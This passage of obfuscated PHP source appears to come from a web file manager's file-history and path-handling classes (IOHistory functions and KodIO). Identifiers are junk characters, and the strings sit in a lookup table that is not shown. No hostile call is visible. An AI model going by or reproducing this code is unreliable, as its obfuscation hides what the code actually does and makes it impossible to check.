$Ğ§§½æ½ . substr($´Øà®È[$–ãÛ•ú[32]], strlen($ÎùæÄĞÇ)); $µÆúÈÜ¶ = IO::move($Âİä“ŞÉ[$–ãÛ•ú[1431]] . $´Øà®È[$–ãÛ•ú[32]], $şŞÌŸñã, !1, $íÔ¶Ğè…); if ($µÆúÈÜ¶) { $Âİä“ŞÉ[$–ãÛ•ú[446]][$ãæçáºË][$–ãÛ•ú[32]] = $íÔ¶Ğè…; } } $Âİä“ŞÉ[$–ãÛ•ú[1432]] = IO::move($Âİä“ŞÉ[$–ãÛ•ú[1432]], $şŞÌŸñã, !1, $Ğ§§½æ½ . $ŸæÀôì³); self::saveData($Âİä“ŞÉ[$–ãÛ•ú[1432]], $Âİä“ŞÉ[$–ãÛ•ú[446]]); self::clearEmptyFolder($Âİä“ŞÉ[$–ãÛ•ú[1431]]); } public static function rollback($»˜Èªï×, $ÕâÉê ) { $«õ½¾é” =& $_SERVER[©—Ò»ÅĞ]; $¢à”¼™å = self::listData($»˜Èªï×); if (!$¢à”¼™å) { return; } $Îæıè¸¶ = IO::info($»˜Èªï×); foreach ($¢à”¼™å[$«õ½¾é”[446]] as $œí…ã”æ => $‹ş›ú) { if ($‹ş›ú[$«õ½¾é”[487]] == $ÕâÉê ) { self::add($»˜Èªï×); $œ‹û¤ú§ = $¢à”¼™å[$«õ½¾é”[1431]] . $‹ş›ú[$«õ½¾é”[32]]; $ÅŞèıÀ = IO::copy($œ‹û¤ú§, IO::pathFather($»˜Èªï×), REPEAT_REPLACE, $Îæıè¸¶[$«õ½¾é”[32]]); if ($ÅŞèıÀ) { self::remove($»˜Èªï×, $ÕâÉê ); } return $ÅŞèıÀ; } } return !1; } public static function setDetail($ìÖƒŒ«, $©Ü´ÆÇ, $¾óŒ¹˜İ) { $ÒÚŸİŞ =& $_SERVER[©—Ò»ÅĞ]; $Šûø„¼ü = self::listData($ìÖƒŒ«); if (!$Šûø„¼ü) { return; } foreach ($Šûø„¼ü[$ÒÚŸİŞ[446]] as $³š¼ı© => $ğÏ’Û’Ë) { if ($ğÏ’Û’Ë[$ÒÚŸİŞ[487]] == $©Ü´ÆÇ) { $Šûø„¼ü[$ÒÚŸİŞ[446]][$³š¼ı©][$ÒÚŸİŞ[1430]] = $¾óŒ¹˜İ; self::saveData($Šûø„¼ü[$ÒÚŸİŞ[1432]], $Šûø„¼ü[$ÒÚŸİŞ[446]]); return !0; } } return !1; } public static function fileInfo($®ˆíéí“, $æŒŞĞŒó) { $ø£ØŸüó =& $_SERVER[©—Ò»ÅĞ]; $Ó“äåı¹ = self::listData($®ˆíéí“); if (!$Ó“äåı¹) { show_json(LNG($ø£ØŸüó[105]), !1); } $†€˜¥­¸ = $ø£ØŸüó[12]; foreach ($Ó“äåı¹[$ø£ØŸüó[446]] as $ùÚ›ü›— => $Øœ‚»”) { if ($Øœ‚»”[$ø£ØŸüó[487]] != $æŒŞĞŒó) { continue; } $†€˜¥­¸ = $Ó“äåı¹[$ø£ØŸüó[1431]] . $Øœ‚»”[$ø£ØŸüó[32]]; break; } if (!$†€˜¥­¸) { show_json(LNG($ø£ØŸüó[105]), !1); } return IO::info($†€˜¥­¸); } public static function fileOut($¹¹æÈñ¡, $‡’¹ÖÖ¯, $¦´±†›Á = false) { $´ˆ¡óÖª =& $_SERVER[©—Ò»ÅĞ]; $ù¤‰¥Ï = self::fileInfo($¹¹æÈñ¡, $‡’¹ÖÖ¯); $¡ÔÁúÏª =& $GLOBALS[$´ˆ¡óÖª[7]]; $¦´±†›Á = isset($¡ÔÁúÏª[$´ˆ¡óÖª[1385]]) && $¡ÔÁúÏª[$´ˆ¡óÖª[1385]] == 1; if (isset($¡ÔÁúÏª[$´ˆ¡óÖª[33]]) && $¡ÔÁúÏª[$´ˆ¡óÖª[33]] == $´ˆ¡óÖª[1433]) { return IO::fileOutImage($ù¤‰¥Ï[$´ˆ¡óÖª[87]], $¡ÔÁúÏª[$´ˆ¡óÖª[1434]]); } IO::fileOut($ù¤‰¥Ï[$´ˆ¡óÖª[87]], $¦´±†›Á, get_path_this($¹¹æÈñ¡)); } public static function listData($ú°Ø½Ò¨, $ëúé—³õ = true) { $ü¦¾˜š¦ =& $_SERVER[©—Ò»ÅĞ]; if ($ëúé—³õ && !IO::exist($ú°Ø½Ò¨)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ú°Ø½Ò¨, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ï¨ˆœˆ£ = self::pathHistory($ú°Ø½Ò¨); $ƒÆä­Á£ = array($ü¦¾˜š¦[1432] => $ï¨ˆœˆ£ . $ü¦¾˜š¦[1421], $ü¦¾˜š¦[1431] => rtrim(get_path_father($ï¨ˆœˆ£), $ü¦¾˜š¦[8]) . $ü¦¾˜š¦[8], $ü¦¾˜š¦[446] => array()); $®˜©‹Æ = IO::getContent($ƒÆä­Á£[$ü¦¾˜š¦[1432]]); if ($®˜©‹Æ) { $Üª²øìö = json_decode($®˜©‹Æ, !0); if (is_array($Üª²øìö)) { $ƒÆä­Á£[$ü¦¾˜š¦[446]] = $Üª²øìö; } } return $ƒÆä­Á£; } private static function saveData($…ıã›˜Å, $¯šù˜ƒç) { $œ¯Ò¥â =& $_SERVER[©—Ò»ÅĞ]; self::log($œ¯Ò¥â[1435] . $…ıã›˜Å . $œ¯Ò¥â[74] . count($¯šù˜ƒç), $œ¯Ò¥â[852]); if ($¯šù˜ƒç) { return IO::setContent($…ıã›˜Å, json_encode($¯šù˜ƒç)); } $Æú´ô»Ã = IO::pathFather($…ıã›˜Å); IO::remove($…ıã›˜Å); self::clearEmptyFolder($Æú´ô»Ã); return !0; } public static function clearEmptyFolder($É«·¢Ù¤) { $Ä¿Ü¾‰© =& $_SERVER[©—Ò»ÅĞ]; if (trim($É«·¢Ù¤, $Ä¿Ü¾‰©[8]) == trim(self::$_historyBase, $Ä¿Ü¾‰©[8])) { return; } $€Æö›şÔ = IO::pathFather($É«·¢Ù¤); $Ÿ§ëáÇó = IO::has($É«·¢Ù¤, !0); if ($Ÿ§ëáÇó[$Ä¿Ü¾‰©[239]] > 0 || $Ÿ§ëáÇó[$Ä¿Ü¾‰©[240]] > 0) { return; } IO::remove($É«·¢Ù¤); self::clearEmptyFolder($€Æö›şÔ); } private static function getBasePath() { $ØšÄ¨­Ö =& $_SERVER[©—Ò»ÅĞ]; $°´Òê•¼ = Model($ØšÄ¨­Ö[1436])->get($ØšÄ¨­Ö[1437]); if ($°´Òê•¼) { if (!IO::exist($°´Òê•¼)) { IO::mkdir($°´Òê•¼); } if (get_path_this($°´Òê•¼) == $ØšÄ¨­Ö[1424]) { $¯×»ğ = $ØšÄ¨­Ö[1438] . rand_string(8); @rename($°´Òê•¼, get_path_father($°´Òê•¼) . $ØšÄ¨­Ö[8] . $¯×»ğ); $°´Òê•¼ = DATA_PATH . $¯×»ğ . $ØšÄ¨­Ö[8]; file_put_contents(DATA_PATH . $ØšÄ¨­Ö[1373], $ØšÄ¨­Ö[12]); Model($ØšÄ¨­Ö[1436])->set($ØšÄ¨­Ö[1437], $°´Òê•¼); } return $°´Òê•¼; } $°´Òê•¼ = DATA_PATH . $ØšÄ¨­Ö[1438] . rand_string(8) . $ØšÄ¨­Ö[8]; $°´Òê•¼ = IO::mkdir($°´Òê•¼); $°´Òê•¼ = rtrim($°´Òê•¼, $ØšÄ¨­Ö[8]) . $ØšÄ¨­Ö[8]; file_put_contents($°´Òê•¼ . $ØšÄ¨­Ö[1373], $ØšÄ¨­Ö[12]); file_put_contents(DATA_PATH . $ØšÄ¨­Ö[1373], $ØšÄ¨­Ö[12]); Model($ØšÄ¨­Ö[1436])->set($ØšÄ¨­Ö[1437], $°´Òê•¼); return $°´Òê•¼; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\145\143\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\106\x69\154\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\106\x69\154\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\160\122\x6f\157\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\x68\x61\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\145\124\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\x65\111\164\x65\155\114\x69\x6e\x6b\175"; const KOD_SHARE_OUTER = "\173\x73\x68\141\x72\x65\111\x74\145\155\x4f\x75\x74\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\x6b\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\x52\x65\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\x72\x7d"; public static function typeList() { $¹ÒÊèß§ =& $_SERVER[©—Ò»ÅĞ]; return array($¹ÒÊèß§[1439] => self::KOD_SOURCE, $¹ÒÊèß§[1440] => self::KOD_USER_RECYCLE, $¹ÒÊèß§[1441] => self::KOD_USER_FAV, $¹ÒÊèß§[1442] => self::KOD_USER_FILE_TAG, $¹ÒÊèß§[1443] => self::KOD_USER_FILE_TYPE, $¹ÒÊèß§[1444] => self::KOD_GROUP_ROOT_SELF, $¹ÒÊèß§[1445] => self::KOD_USER_SHARE, $¹ÒÊèß§[1446] => self::KOD_USER_SHARE_LINK, $¹ÒÊèß§[1447] => self::KOD_USER_SHARE_TO_ME, $¹ÒÊèß§[1448] => self::KOD_SHARE_ITEM, $¹ÒÊèß§[1449] => self::KOD_SHARE_LINK, $¹ÒÊèß§[1450] => self::KOD_SHARE_OUTER, $¹ÒÊèß§[1451] => self::KOD_SEARCH, $¹ÒÊèß§[1452] => self::KOD_BLOCK, $¹ÒÊèß§[1453] => self::KOD_IO, $¹ÒÊèß§[1454] => self::KOD_USER_RECENT, $¹ÒÊèß§[1455] => self::KOD_USER_DRIVER); } public static function parse($ãù­Ê) { $â‘›² =& $_SERVER[©—Ò»ÅĞ]; $ãù­Ê = self::clear($ãù­Ê); $µ±ÙìÛ” = array_values(self::typeList()); preg_match($â‘›²[1456], $ãù­Ê, $¼áñ§›Ó); $ÕŠ»õÜ = array($â‘›²[511] => !1, $â‘›²[1457] => !1, $â‘›²[508] => !1, $â‘›²[87] => $ãù­Ê, $â‘›²[1357] => !1, $â‘›²[1356] => $â‘›²[12]); if (is_array($¼áñ§›Ó) && count($¼áñ§›Ó) == 5) { $’ï¬¾˜ª = $â‘›²[1458] . $¼áñ§›Ó[2] . $â‘›²[402]; if (in_array($’ï¬¾˜ª, $µ±ÙìÛ”)) { $ÕŠ»õÜ[$â‘›²[1357]] = $¼áñ§›Ó[1]; $ÕŠ»õÜ[$â‘›²[33]] = $’ï¬¾˜ª; $ÕŠ»õÜ[$â‘›²[1459]] = substr($’ï¬¾˜ª, 1, -1); $ÕŠ»õÜ[$â‘›²[487]] = $¼áñ§›Ó[3]; } $ÕŠ»õÜ[$â‘›²[1356]] = $¼áñ§›Ó[4]; } if ($ÕŠ»õÜ[$â‘›²[511]] == self::KOD_SOURCE) { $ÕŠ»õÜ[$â‘›²[487]] = intval($ÕŠ»õÜ[$â‘›²[487]]); $ÕŠ»õÜ[$â‘›²[1360]] = $ÕŠ»õÜ[$â‘›²[487]]; } $ôë—¿Äà = array($â‘›²[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ÕŠ»õÜ[$â‘›²[1423]] = in_array($ÕŠ»õÜ[$â‘›²[33]], $ôë—¿Äà); return $ÕŠ»õÜ; } public static function isTruePath($Öìİ³ÅŸ) { $¸¦Ê¯Û² =& $_SERVER[©—Ò»ÅĞ]; if (substr($Öìİ³ÅŸ, 0, 1) != $¸¦Ê¯Û²[1458]) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[498]) === 0) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[1427]) === 0) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[1460]) === 0) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[1461]) === 0) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[1462]) === 0) { return !0; } if (strpos($Öìİ³ÅŸ, $¸¦Ê¯Û²[1463]) === 0) { return !0; } return !1; } public static function clear($‚¨äåÒØ) { $Ë©ºçÅÈ =& $_SERVER[©—Ò»ÅĞ]; $‚¨äåÒØ = str_replace(array($Ë©ºçÅÈ[1250], $Ë©ºçÅÈ[285]), $Ë©ºçÅÈ[53], $‚¨äåÒØ); $‚¨äåÒØ = str_replace($Ë©ºçÅÈ[97], $Ë©ºçÅÈ[8], $‚¨äåÒØ); $ã«ıãñÁ = $Ë©ºçÅÈ[1464]; if (substr($‚¨äåÒØ, 0, 3) == $Ë©ºçÅÈ[1465]) { $‚¨äåÒØ = substr($‚¨äåÒØ, 3); } while (strstr($‚¨äåÒØ, $ã«ıãñÁ)) { $‚¨äåÒØ = str_replace($ã«ıãñÁ, $Ë©ºçÅÈ[8], $‚¨äåÒØ); } $‚¨äåÒØ = preg_replace($Ë©ºçÅÈ[1466], $Ë©ºçÅÈ[8], $‚¨äåÒØ); if ($‚¨äåÒØ == $Ë©ºçÅÈ[8]) { return $Ë©ºçÅÈ[8]; } $‚¨äåÒØ = rtrim($‚¨äåÒØ, $Ë©ºçÅÈ[8]); return $‚¨äåÒØ; } public static function pathTrue($âÀ©¨î) { $´Ü‡Í±” =& $_SERVER[©—Ò»ÅĞ]; if (!$âÀ©¨î) { return $´Ü‡Í±”[12]; } $âÀ©¨î = str_replace($´Ü‡Í±”[254], $´Ü‡Í±”[8], str_replace($´Ü‡Í±”[1467], $´Ü‡Í±”[8], $âÀ©¨î)); $âÀ©¨î = str_replace($´Ü‡Í±”[254], $´Ü‡Í±”[8], str_replace($´Ü‡Í±”[1467], $´Ü‡Í±”[8], $âÀ©¨î)); if (!strstr($âÀ©¨î, $´Ü‡Í±”[1465])) { return $âÀ©¨î; } $ı¤ĞÂß = explode($´Ü‡Í±”[8], $âÀ©¨î); foreach ($ı¤ĞÂß as $î˜–Ÿüû => $Şû—¾ıô) { if ($Şû—¾ıô !== $´Ü‡Í±”[1468]) { continue; } for ($ú²„‡£í = $î˜–Ÿüû; $ú²„‡£í >= 0; $ú²„‡£í--) { if ($ı¤ĞÂß[$ú²„‡£í] === $´Ü‡Í±”[10] || $ı¤ĞÂß[$ú²„‡£í] === $´Ü‡Í±”[1468] || $ı¤ĞÂß[$ú²„‡£í] === -1) { continue; } if ($ı¤ĞÂß[$ú²„‡£í] === $´Ü‡Í±”[12]) { $ı¤ĞÂß[$î˜–Ÿüû] = -1; break; } $ı¤ĞÂß[$î˜–Ÿüû] = -1; $ı¤ĞÂß[$ú²„‡£í] = -1; break; } } $É¹¬ÊŞš = array(); foreach ($ı¤ĞÂß as $Şû—¾ıô) { if ($Şû—¾ıô !== -1) { $É¹¬ÊŞš[] = $Şû—¾ıô; } } $½üÊ¿Í¨ = implode($´Ü‡Í±”[8], $É¹¬ÊŞš); if (strpos($½üÊ¿Í¨, $´Ü‡Í±”[1469]) === 0) { $½üÊ¿Í¨ = $´Ü‡Í±”[1465] . substr($½üÊ¿Í¨, strlen($´Ü‡Í±”[1469])); } return $½üÊ¿Í¨; } public static function pathUrlClear($¬£¥‚ıË) { $ö”Ä†µß =& $_SERVER[©—Ò»ÅĞ]; if (!$¬£¥‚ıË) { return $¬£¥‚ıË; } $¬£¥‚ıË = rawurldecode($¬£¥‚ıË); $¬£¥‚ıË = str_replace($ö”Ä†µß[1467], $ö”Ä†µß[8], $¬£¥‚ıË); if (strpos($¬£¥‚ıË, $ö”Ä†µß[76]) > 0) { $¬£¥‚ıË = substr($¬£¥‚ıË, 0, strpos($¬£¥‚ıË, $ö”Ä†µß[76])); } if (strpos($¬£¥‚ıË, $ö”Ä†µß[1470]) > 0) { $¬£¥‚ıË = substr($¬£¥‚ıË, 0, strpos($¬£¥‚ıË, $ö”Ä†µß[1470])); } return $¬£¥‚ıË; } public static function sourceID($Í¹’Ã½£) { $á‡Åµê =& $_SERVER[©—Ò»ÅĞ]; $óÄ‰ç³ñ = self::parse($Í¹’Ã½£); if ($óÄ‰ç³ñ[$á‡Åµê[33]] !== self::KOD_SOURCE) { show_json(LNG($á‡Åµê[1471]), !1); } return $óÄ‰ç³ñ[$á‡Åµê[487]]; } public static function make($ığ©¨¼‰) { if (!$ığ©¨¼‰) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ığ©¨¼‰)); } public static function makeShare($ƒ´•Ö•¨, $İè—Âàù) { return self::makePath(self::KOD_SHARE_ITEM, $ƒ´•Ö•¨, $İè—Âàù); } public static function makeFileTypePath($´Å‚é‚) { return self::makePath(self::KOD_USER_FILE_TYPE, $´Å‚é‚); } public static function makeFileTagPath($ãÙ„ºüø) { return self::makePath(self::KOD_USER_FILE_TAG, $ãÙ„ºüø); } public static function makePath($›¬¢›”Ô, $Ëª¾Ã¢Á = '', $»ğş¥åª = '') { $§’üÄšé =& $_SERVER[©—Ò»ÅĞ]; $‘Î×à¼¢ = substr($›¬¢›”Ô, 1, -1); $ï²€ç = $§’üÄšé[1472] . $‘Î×à¼¢ . $§’üÄšé[1473] . $Ëª¾Ã¢Á . $§’üÄšé[1474]; $ï²€ç = $»ğş¥åª ? $ï²€ç . $»ğş¥åª . $§’üÄšé[8] : $ï²€ç; return $ï²€ç; } public static function hashPath($şê±ŸÄş, $¤Ê¾ñüü = false) { $·ı™®Õ =& $_SERVER[©—Ò»ÅĞ]; if (!$şê±ŸÄş) { return $·ı™®Õ[12]; } $ˆ‚âéû¯ = is_array($şê±ŸÄş) ? $şê±ŸÄş : IO::info($şê±ŸÄş); $ñ¸˜¿Ä§ = _get($ˆ‚âéû¯, $·ı™®Õ[1475], $·ı™®Õ[12]); if (!$ñ¸˜¿Ä§ && isset($ˆ‚âéû¯[$·ı™®Õ[557]])) { $ñ¸˜¿Ä§ = $ˆ‚âéû¯[$·ı™®Õ[557]]; } if (!$ñ¸˜¿Ä§ && isset($ˆ‚âéû¯[$·ı™®Õ[235]])) { $ñ¸˜¿Ä§ = trim($ˆ‚âéû¯[$·ı™®Õ[235]], $·ı™®Õ[118]); } if ($ñ¸˜¿Ä§) { return $ñ¸˜¿Ä§; } if (!$ñ¸˜¿Ä§ && isset($ˆ‚âéû¯[$·ı™®Õ[191]]) && $ˆ‚âéû¯[$·ı™®Õ[191]]) { $ˆ‚âéû¯ = IO::info(KodIO::make($ˆ‚âéû¯[$·ı™®Õ[191]])); $ñ¸˜¿Ä§ = _get($ˆ‚âéû¯, $·ı™®Õ[1475], $·ı™®Õ[12]); if (!$ñ¸˜¿Ä§ && isset($ˆ‚âéû¯[$·ı™®Õ[557]])) { $ñ¸˜¿Ä§ = $ˆ‚âéû¯[$·ı™®Õ[557]]; } } $‹æÙŞÂ¯ = md5($ˆ‚âéû¯[$·ı™®Õ[87]] . $ˆ‚âéû¯[$·ı™®Õ[79]] . $ˆ‚âéû¯[$·ı™®Õ[88]]); $Ä’§öŒ¤ = $‹æÙŞÂ¯ . $·ı™®Õ[1476]; $ñ¸˜¿Ä§ = $ñ¸˜¿Ä§ ? $ñ¸˜¿Ä§ : Cache::get($Ä’§öŒ¤); if (!$ñ¸˜¿Ä§ && $¤Ê¾ñüü) { $ñ¸˜¿Ä§ = IO::hashSimple($ˆ‚âéû¯[$·ı™®Õ[87]]); Cache::set($Ä’§öŒ¤, $ñ¸˜¿Ä§ ? $ñ¸˜¿Ä§ : $‹æÙŞÂ¯, 3600 * 24 * 30); } return $ñ¸˜¿Ä§ ? $ñ¸˜¿Ä§ : $‹æÙŞÂ¯; } public static function hashPathSafe($‚ÅéÑª, $ÕØñÄåÍ = false) { $´–²¥ü— =& $_SERVER[©—Ò»ÅĞ]; $ıó¤«ØÕ = self::hashPath($‚ÅéÑª, $ÕØñÄåÍ); return md5($ıó¤«ØÕ . $´–²¥ü—[1477] . Model($´–²¥ü—[873])->get($´–²¥ü—[874])); } public static function initSystemPath() { $È‡‚­ =& $_SERVER[©—Ò»ÅĞ]; if (defined($È‡‚­[1478])) { return; } define($È‡‚­[1478], self::systemPath($È‡‚­[189])); define($È‡‚­[1479], self::systemPath($È‡‚­[1480])); define($È‡‚­[1481], self::systemPath($È‡‚­[1482])); define($È‡‚­[1483], self::systemPath($È‡‚­[1484])); IOHistory::bindEvent(); } public static function systemPath($€ßÉğ©¥) { $ŒÍ®‡™ =& $_SERVER[©—Ò»ÅĞ]; $Ø­ª¶µ³ = $ŒÍ®‡™[1485] . ucfirst($€ßÉğ©¥); $ÙÔÃ“˜Ó = Model($ŒÍ®‡™[873])->get($Ø­ª¶µ³); if ($ÙÔÃ“˜Ó) { return $ÙÔÃ“˜Ó; } if ($€ßÉğ©¥ == $ŒÍ®‡™[189]) { $ÙÔÃ“˜Ó = self::make(Model($ŒÍ®‡™[933])->systemRootPathAdd($ŒÍ®‡™[628])); } else { $ÙÔÃ“˜Ó = self::systemPath($ŒÍ®‡™[189]); $ æÈ”¥ = self::sourceID($ÙÔÃ“˜Ó); $ÙÔÃ“˜Ó = self::make(Model($ŒÍ®‡™[933])->mkdir($ æÈ”¥, $€ßÉğ©¥)); } Model($ŒÍ®‡™[873])->set($Ø­ª¶µ³, $ÙÔÃ“˜Ó); return $ÙÔÃ“˜Ó; } public static function systemFolder($¦ÀŠŸÚ£) { $ã¹‚»Æ‘ = IO_PATH_SYSTEM_SOURCE . $¦ÀŠŸÚ£; $€³Šã€ò = Cache::get($ã¹‚»Æ‘); if (!$€³Šã€ò) { $¾Øã×¹  = IO::infoFullSimple($ã¹‚»Æ‘); if (!$¾Øã×¹ ) { $€³Šã€ò = IO::mkdir($ã¹‚»Æ‘, REPEAT_SKIP); } else { $€³Šã€ò = $¾Øã×¹ [$_SERVER[©—Ò»ÅĞ][87]]; } Cache::set($ã¹‚»Æ‘, $€³Šã€ò, 3600 * 10); } return $€³Šã€ò; } public static function defaultDriver() { return Model($_SERVER[©—Ò»ÅĞ][868])->defaultDriver(); } public static function defaultDriverInit() { $ÖØù³Úš =& $_SERVER[©—Ò»ÅĞ]; static $ËøÜ€˜¥ = false; if ($ËøÜ€˜¥) { return $ËøÜ€˜¥; } $Äã´œ´ = self::defaultDriver(); $ËøÜ€˜¥ = IO::init($ÖØù³Úš[1486] . $Äã´œ´[$ÖØù³Úš[487]] . $ÖØù³Úš[1474]); return $ËøÜ€˜¥; } public static function fileTypeList() { $§›¶µî =& $_SERVER[©—Ò»ÅĞ]; $ºşø’¥ = $GLOBALS[$§›¶µî[6]][$§›¶µî[1487]]; foreach ($ºşø’¥ as $î¸—±á­ => $ı€‘Ì›) { $òî”Ÿê“ = $§›¶µî[1488] . $î¸—±á­; $â¸‘ñÄÅ = LNG($òî”Ÿê“); if ($òî”Ÿê“ != $â¸‘ñÄÅ) { $ºşø’¥[$î¸—±á­][$§›¶µî[32]] = $â¸‘ñÄÅ; } } return $ºşø’¥; } public static function ioFileDriverGet($¹§úí = '') { $ñ‘Ü—øé =& $_SERVER[©—Ò»ÅĞ]; static $ë–º­  = array(); static $Ÿ…—¶‚¥ = array(); static $‰é­¿â = array(); static $ø­ëóÔ¡ = false; if ($ø­ëóÔ¡ === !1) { $ø­ëóÔ¡ = array($ñ‘Ü—øé[598] => array(), $ñ‘Ü—øé[684] => array()); $ì¯’ÄÍË = Model($ñ‘Ü—øé[1489])->get(!1, $ñ‘Ü—øé[1490]); foreach ($ì¯’ÄÍË as $Æè şí => $Ëò“·ø—) { if (!$Ëò“·ø— || $Ëò“·ø— == $ñ‘Ü—øé[12]) { continue; } if (strstr($Æè şí, $ñ‘Ü—øé[1491])) { $¸†´ïİÌ = str_replace($ñ‘Ü—øé[1491], $ñ‘Ü—øé[12], $Æè şí); $ø­ëóÔ¡[$ñ‘Ü—øé[598]][$¸†´ïİÌ] = $Ëò“·ø—; } else { if (strstr($Æè şí, $ñ‘Ü—øé[1492])) { $¸†´ïİÌ = str_replace($ñ‘Ü—øé[1492], $ñ‘Ü—øé[12], $Æè şí); $ø­ëóÔ¡[$ñ‘Ü—øé[684]][$¸†´ïİÌ] = $Ëò“·ø—; } } } } $øú·ü¼¸ = self::defaultDriver(); if (!$¹§úí || !$ø­ëóÔ¡[$ñ‘Ü—øé[598]] && !$ø­ëóÔ¡[$ñ‘Ü—øé[684]]) { return $øú·ü¼¸; } $¦¿÷•À€ = self::getPathSourceID($¹§úí); if (!$¦¿÷•À€) { return $øú·ü¼¸; } if (isset($ë–º­ [$¦¿÷•À€])) { return $ë–º­ [$¦¿÷•À€]; } $åíî¯˜‚ = Model($ñ‘Ü—øé[933])->sourceInfo($¦¿÷•À€); $íÊ–¡´ = $åíî¯˜‚[$ñ‘Ü—øé[589]]; $Ÿ­Ï€ë = array(); if (!$åíî¯˜‚) { return $øú·ü¼¸; } if ($åíî¯˜‚[$ñ‘Ü—øé[188]] == $ñ‘Ü—øé[91]) { if (isset($‰é­¿â[$íÊ–¡´])) { return $‰é­¿â[$íÊ–¡´]; } if (isset($ø­ëóÔ¡[$ñ‘Ü—øé[684]][$íÊ–¡´])) { $å÷ÊÕ¨° = Model($ñ‘Ü—øé[868])->driverInfo($ø­ëóÔ¡[$ñ‘Ü—øé[684]][$íÊ–¡´]); $øú·ü¼¸ = $å÷ÊÕ¨° ? $å÷ÊÕ¨° : $øú·ü¼¸; $‰é­¿â[$íÊ–¡´] = $øú·ü¼¸; $ë–º­ [$¦¿÷•À€] = $øú·ü¼¸; return $øú·ü¼¸; } $Ÿ­Ï€ë = self::groupParentUser($íÊ–¡´); } else { if ($åíî¯˜‚[$ñ‘Ü—øé[188]] == $ñ‘Ü—øé[524]) { $ùÏİşŞ— = Model($ñ‘Ü—øé[1493])->getInfo($íÊ–¡´); if ($ùÏİşŞ—) { $Ÿ­Ï€ë = explode($ñ‘Ü—øé[50], trim($ùÏİşŞ—[$ñ‘Ü—øé[604]], $ñ‘Ü—øé[50])); $Ÿ­Ï€ë = array_remove_value($Ÿ­Ï€ë, $ñ‘Ü—øé[228]); $Ÿ­Ï€ë[] = $íÊ–¡´; $Ÿ­Ï€ë = array_reverse($Ÿ­Ï€ë); } } } foreach ($Ÿ­Ï€ë as $„ÆÁòÊ) { if (!isset($ø­ëóÔ¡[$ñ‘Ü—øé[598]][$„ÆÁòÊ])) { continue; } if (isset($Ÿ…—¶‚¥[$„ÆÁòÊ])) { return $Ÿ…—¶‚¥[$„ÆÁòÊ]; } $å÷ÊÕ¨° = Model($ñ‘Ü—øé[868])->driverInfo($ø­ëóÔ¡[$ñ‘Ü—øé[598]][$„ÆÁòÊ]); $øú·ü¼¸ = $å÷ÊÕ¨° ? $å÷ÊÕ¨° : $øú·ü¼¸; $Ÿ…—¶‚¥[$„ÆÁòÊ] = $øú·ü¼¸; break; } if ($åíî¯˜‚[$ñ‘Ü—øé[188]] == $ñ‘Ü—øé[91]) { $‰é­¿â[$íÊ–¡´] = $øú·ü¼¸; } $ë–º­ [$¦¿÷•À€] = $øú·ü¼¸; return $øú·ü¼¸; } private static function getPathSourceID($¹·Åå¾æ) { $ŒÁ’ş¨û =& $_SERVER[©—Ò»ÅĞ]; static $•¦ó§Ç¾ = array(); if (!$¹·Åå¾æ) { return $ŒÁ’ş¨û[12]; } $››ºÛ„ß = substr($¹·Åå¾æ, 0, strlen($ŒÁ’ş¨û[498])) == $ŒÁ’ş¨û[498]; $îóµŠ¸ê = substr($¹·Åå¾æ, 0, strlen($ŒÁ’ş¨û[1460])) == $ŒÁ’ş¨û[1460]; $¨× òÕ = substr($¹·Åå¾æ, 0, strlen($ŒÁ’ş¨û[1461])) == $ŒÁ’ş¨û[1461]; if (!$››ºÛ„ß && !$îóµŠ¸ê && !$¨× òÕ) { return $ŒÁ’ş¨û[12]; } $šª÷Ññ = self::parse($¹·Åå¾æ); $ºï—ş©” = $šª÷Ññ[$ŒÁ’ş¨û[1357]]; if ($››ºÛ„ß) { return $šª÷Ññ[$ŒÁ’ş¨û[487]]; } if (isset($•¦ó§Ç¾[$ºï—ş©”])) { $³Ê®–Ûä = $•¦ó§Ç¾[$ºï—ş©”]; } else { $³Ê®–Ûä = IO::init($ºï—ş©”); $•¦ó§Ç¾[$ºï—ş©”] = $³Ê®–Ûä; } if (isset($³Ê®–Ûä->pathParse[$ŒÁ’ş¨û[1360]])) { return $³Ê®–Ûä->pathParse[$ŒÁ’ş¨û[1360]]; } return $ŒÁ’ş¨û[12]; } private static function groupParentUser($ë‹úÙñÃ) { $ ıƒÊ‡À =& $_SERVER[©—Ò»ÅĞ]; $¿ÔƒŒóÛ = Model($ ıƒÊ‡À[617])->getInfo($ë‹úÙñÃ); if (!$¿ÔƒŒóÛ) { return array(); } $¤‡¦öŠï = array_to_keyvalue($¿ÔƒŒóÛ[$ ıƒÊ‡À[1494]], $ ıƒÊ‡À[12], $ ıƒÊ‡À[1495]); $Û©ƒ¸¤ = array(); 